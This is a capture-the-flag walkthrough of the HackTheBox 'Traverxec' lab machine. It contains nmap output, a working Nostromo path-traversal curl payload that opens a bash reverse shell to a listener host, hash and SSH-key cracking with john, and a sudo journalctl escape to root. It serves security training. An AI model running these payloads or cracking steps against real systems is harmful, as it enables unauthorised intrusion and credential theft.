# Traverxec Walkthrough

![traverxec](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Treaverxec/traverxec.png)

## let's first fast scan machine using nmap

```console
sudo nmap -F -sV 10.10.10.165
```

### Result

```
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) 
80/tcp open  http    nostromo 1.9.6 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## we got two port let's also do a berif scan.

```console
sudo nmap -A -O -v --script vuln 10.10.10.165
```

### Result

```
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) 
| vulners:  
|   cpe:/a:openbsd:openssh:7.9p1:  
|       MSF:ILITIES/UBUNTU-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/     *
EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/  *EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2019-25017/        5.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/ *EXPLO
IT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/     5.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CV
E-2019-6111/    *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/      5.8     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2019-6111/     *EXPLOIT* 
|       MSF:ILITIES/IBM-AIX-CVE-2019-6111/      5.8     https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/    *
EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/    5.8     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/  *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/     *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/   5.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-
CVE-2019-6111/  *EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/
*EXPLOIT* 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C8
4C508837551A19  *EXPLOIT* 
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC
9D6DDDD97F9E97  *EXPLOIT* 
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT* 
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT* 
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111 
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT* 
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT* 
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617 
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2020-14145/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP9-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/ *
EXPLOIT* 
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145 
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110 
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109 
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685 
|_      PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT* 
80/tcp open  http    nostromo 1.9.6 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
| http-enum:  
|_  /css/: Potentially interesting folder w/ directory listing 
| http-csrf:  
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.165 
|   Found the following possible CSRF vulnerabilities:  
|      
|     Path: http://10.10.10.165:80/ 
|     Form id: contact-name 
|_    Form action: empty.html 
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug) 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 5.1 (92%), Crestron XPanel control system (90%), 
Linux 3.18 (89%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS devi
ce (87%) 
No exact OS matches for host (test conditions non-ideal). 
Uptime guess: 20.375 days (since Wed Mar 23 09:13:15 2022) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=262 (Good luck!) 
IP ID Sequence Generation: All zeros 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
 
TRACEROUTE (using port 80/tcp) 
HOP RTT       ADDRESS 
1   319.68 ms 10.10.14.1 
2   312.29 ms 10.10.10.165
```
nd one remote code execution exploit . 

```

## now i search for exploit of nostromo 1.9.6  exploit not working then i use exploit payload with curl for reverse shell command given below.

```console
curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.10/4444 0>&1"'
```

## and then start a netcat listner and got shell then i start enumerating and in /var/nostromo/conf found a file name .htpasswd in that file i got hash of david user.

```console
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd     
cat .htpasswd 
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

## i copy the hash in a file on my local machine then i try to crack it with john the ripper.

```console
$ john --wordlist=/usr/share/wordlists/rockyou.txt htpasswd  
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long" 
Use the "--format=md5crypt-long" option to force loading these as that type instead 
Using default input encoding: UTF-8 
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) 
Will run 8 OpenMP threads 
Press 'q' or Ctrl-C to abort, almost any other key for status 
Nowonly4me       (david) 
1g 0:00:00:50 DONE (2022-04-12 19:13) 0.01986g/s 210139p/s 210139c/s 210139C/s NuiMeanPoon..Nous4=5 
Use the "--show" option to display all of the cracked passwords reliably 
Session completed
```

## hash cracked successfully

## in the same directory (/var/nostromo/conf) i got another file name nhttpd.conf when i  read this file i got some directories

```console
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
cat nhttpd.conf 
# MAIN [MANDATORY] 
 
servername              traverxec.htb 
serverlisten            * 
serveradmin             david@traverxec.htb 
serverroot              /var/nostromo 
servermimes             conf/mimes 
docroot                 /var/nostromo/htdocs 
docindex                index.html 
 
# LOGS [OPTIONAL] 
 
logpid                  logs/nhttpd.pid 
 
# SETUID [RECOMMENDED] 
 
user                    www-data 
 
# BASIC AUTHENTICATION [OPTIONAL] 
 
htaccess                .htaccess 
htpasswd                /var/nostromo/conf/.htpasswd 
 
# ALIASES [OPTIONAL] 
 
/icons                  /var/nostromo/icons 
 
# HOMEDIRS [OPTIONAL] 
 
homedirs                /home 
homedirs_public         public_www
```

## then i go in /home/david/public_www and found a file with .tz extension i download it using wget with user and passaword we got earilier

```console
wget http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz
```

## i extract this file using tar

```console
tar -xvf protected-file-area/backup-ssh-identity-files.tgz
```

## i go a directory name /home/david/.ssh in this directory got a ssh private key named as id_rsa i use ssh2john for hash and then with the help of john i crack this hash.

```console
$ python2 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash 

$ ls                                                                                                                  
authorized_keys  id_rsa  id_rsa.hash  id_rsa.pub 

$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash   
Using default input encoding: UTF-8 
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) 
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes 
Cost 2 (iteration count) is 1 for all loaded hashes 
Will run 8 OpenMP threads 
Note: This format may emit false positives, so it will keep trying even after 
finding a possible candidate. 
Press 'q' or Ctrl-C to abort, almost any other key for status 
hunter           (id_rsa) 
Warning: Only 2 candidates left, minimum 8 needed for performance. 
1g 0:00:00:02 DONE (2022-04-12 21:11) 0.4098g/s 5877Kp/s 5877Kc/s 5877KC/sa6_123..*7¡Vamos! 
Session completed
```

## then i try to login with that id_rsa key and founded passphase 

```console
$ ssh -i id_rsa david@10.10.10.165 
Enter passphrase for key 'id_rsa':  
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 
david@traverxec:~$ ls 
bin  public_www  user.txt
```

## we got access to user david. now it's time for priv escalation.  

## here we have a directory name bin i found a .sh file in this folder i found last line interesting

```console
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash 
 
cat /home/david/bin/server-stats.head 
echo "Load: `/usr/bin/uptime`" 
echo " " 
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`" 
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`" 
echo " " 
echo "Last 5 journal log lines:" 
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

## then i search on https://gtfobins.github.io/gtfobins/journalctl/ i got sudo entry.

## then i run below command and it open in less mode.

```console
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

## then i type 

```console
!/bin/bash
root@traverxec:/home/david/bin#
```

## BOOOMMMM!!! WE GOT ROOT.

![funny](https://c.tenor.com/HRvmHAnn9hAAAAAM/chris-farley.gif)
 
